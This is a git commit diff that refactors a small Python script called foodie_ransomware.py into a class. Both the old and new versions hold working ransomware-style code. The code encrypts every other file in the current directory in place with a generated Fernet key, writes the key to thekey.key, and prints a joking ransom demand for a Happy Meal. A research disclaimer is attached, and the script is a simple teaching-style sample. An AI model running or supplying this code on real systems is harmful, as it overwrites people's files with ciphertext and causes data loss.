13fd88689d1430138a4bf8d760bc098dc8119cbf
hnyuht <hnyuht@gmail.com>
2023-09-16 09:31:38 -0600

    Update foodie_ransomware.py

--- foodie_ransomware.py
+++ foodie_ransomware.py
@@ -1,47 +1,62 @@
 #!/usr/bin/env python3
 
-# DISCLAIMER: This code is provided for research and detection purposes only.
-# It is intended to be used responsibly and legally to protect computer systems,
-# data, and networks from potential threats. Any misuse of this code for malicious
-# purposes is strictly prohibited and may be subject to legal consequences.
-
 import os
 from cryptography.fernet import Fernet
 
-# Function to find eligible files in the current directory
-def find_eligible_files():
-    eligible_files = []
-    for file in os.listdir():
-        if file not in ["foodie.py", "thekey.key", "decrypt.py"] and os.path.isfile(file):
-            eligible_files.append(file)
-    return eligible_files
+class FileEncryptor:
+    """
+    DISCLAIMER: This code is provided for research and detection purposes only.
+    It is intended to be used responsibly and legally to protect computer systems,
+    data, and networks from potential threats. Any misuse of this code for malicious
+    purposes is strictly prohibited and may be subject to legal consequences.
+    """
 
-def main():
-    # Let's find some eligible files
-    files = find_eligible_files()
+    def __init__(self):
+        self.key = None
 
-    if not files:
-        print("No eligible files found.")
-        return
+    def find_eligible_files(self):
+        eligible_files = []
+        for file in os.listdir():
+            if file not in ["foodie.py", "thekey.key", "decrypt.py"] and os.path.isfile(file):
+                eligible_files.append(file)
+        return eligible_files
 
-    print("Eligible files:", files)
+    def generate_key(self):
+        self.key = Fernet.generate_key()
 
-    # Generate an encryption key
-    key = Fernet.generate_key()
+    def save_key_to_file(self, filename="thekey.key"):
+        if self.key:
+            with open(filename, "wb") as key_file:
+                key_file.write(self.key)
+        else:
+            print("No key to save. Please generate a key first.")
 
-    # Save the key to a file named "thekey.key"
-    with open("thekey.key", "wb") as key_file:
-        key_file.write(key)
+    def encrypt_files(self, files):
+        if self.key:
+            for file in files:
+                with open(file, "rb") as input_file:
+                    contents = input_file.read()
+                contents_encrypted = Fernet(self.key).encrypt(contents)
+                with open(file, "wb") as output_file:
+                    output_file.write(contents_encrypted)
+        else:
+            print("No key available. Please generate a key first.")
 
-    # Encrypt eligible files using the generated key
-    for file in files:
-        with open(file, "rb") as input_file:
-            contents = input_file.read()
-        contents_encrypted = Fernet(key).encrypt(contents)
-        with open(file, "wb") as output_file:
-            output_file.write(contents_encrypted)
+    def run(self):
+        eligible_files = self.find_eligible_files()
 
-    print("All of your files have been encrypted!! Send me a Happy Meal with Chocolate Milk!!")
+        if not eligible_files:
+            print("No eligible files found.")
+            return
+
+        print("Eligible files:", eligible_files)
+
+        self.generate_key()
+        self.save_key_to_file()
+        self.encrypt_files(eligible_files)
+
+        print("All of your files have been encrypted!! Send me a Happy Meal with Chocolate Milk!!")
 
 if __name__ == "__main__":
-    main()
+    encryptor = FileEncryptor()
+    encryptor.run()
